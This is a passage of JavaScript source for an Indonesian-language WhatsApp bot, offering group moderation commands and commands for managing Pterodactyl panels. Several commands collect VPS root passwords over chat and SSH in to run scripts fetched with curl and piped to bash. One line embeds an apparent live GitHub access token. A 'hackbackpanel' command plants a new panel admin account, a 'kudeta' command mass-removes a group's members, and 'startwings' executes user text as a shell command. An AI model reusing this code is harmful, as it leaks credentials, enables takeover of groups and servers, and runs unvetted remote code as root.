let foto = await Xyro.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Xyro.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Xyro.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Xyro.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Xyro.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Xyro.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Xyro.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Xyro.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Xyro.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Xyro.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Xyro.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Xyro.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Xyro.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Xyro.newsletterMetadata("invite", result)
await Xyro.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Xyro.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Xyro.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Xyro Starting 🔥")
for (let i of memberFilter) {
await Xyro.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Xyro.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Xyro.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/XstyanzZx/xyroku/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`bashandtokenbyxyro\n`) // Key Token : bashandtokenbyxyro
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285179856312\n');
stream.write('https://chat.whatsapp.com/Hbr1z88vxdv4ebA8Agy9kk\n');
stream.write('https://chat.whatsapp.com/KdJpv9x9Tvz1cdee24dFNw\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installthemeelysium": case "installtemaelysium": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s -H "Authorization: token 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" https://raw.githubusercontent.com/XstyanzZx/Elsyum/main/elsyum.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('elysiumbyxyro\n') // Key Token : elysiumbyxyro
stream.write('1\n')
stream.write('yes\n')
stream.write('x\n')
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installthemenightcore": case "installtemanightcore": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Xyro\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Xyro\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 14 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Xyro.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 14 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Xyro.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
